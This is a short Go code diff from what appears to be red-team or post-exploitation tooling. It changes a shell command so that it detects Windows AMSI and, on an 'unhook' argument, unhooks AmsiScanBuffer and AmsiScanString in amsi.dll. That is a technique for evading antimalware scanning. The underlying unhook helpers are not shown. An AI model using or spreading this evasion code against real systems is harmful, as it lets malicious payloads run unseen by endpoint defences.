@@ -64,7 +64,12 @@ func ChangePrompt(c *ishell.Context, module string) {
 }
 
 func Amsi(c *ishell.Context) {
-	hasAmsi, dll, err := execute_assembly.HasAmsi()
+	unhook := false
+	if len(c.Args) > 0 && c.Args[0] == "unhook" {
+		unhook = true
+	}
+
+	hasAmsi, err := execute_assembly.HasAmsi()
 	if err != nil {
 		c.Printf("failed to check for amsi: %v\n", err)
 		return
@@ -73,19 +78,27 @@ func Amsi(c *ishell.Context) {
 	if !hasAmsi {
 		c.Println("amsi not detected")
 		return
+	} else {
+		c.Println("amsi detected")
 	}
 
-	c.Println("amsi detected")
-	c.Printf("amsi.dll: 						%#v\n", dll.DllBase)
-	c.Printf("amsi.AmsiScanBuffer:	%#v\n", dll.FnPtr)
+	if unhook {
+		fns := []string{
+			"AmsiScanBuffer",
+			"AmsiScanString",
+		}
 
-	c.Println("attempting unhook")
-	err = execute_assembly.UnhookAmsi(dll.DllBase)
-	if err != nil {
-		c.Printf("failed to unhook amsi: %v\n", err)
-		return
+		for _, fn := range fns {
+			dll, err := execute_assembly.UnhookFunction("amsi.dll", fn)
+			if err != nil {
+				c.Printf("failed to unhook %s: %v\n", fn, err)
+				return
+			}
+			c.Printf(
+				"unhooked %s at : 0x%08x + 0x%04x = 0x%08x\n",
+				fn, dll.DllBaseAddr, dll.FuncOffset, dll.FuncAddress)
+		}
 	}
-	c.Println("unhook successful")
 }
 
 func GetHostname() string {
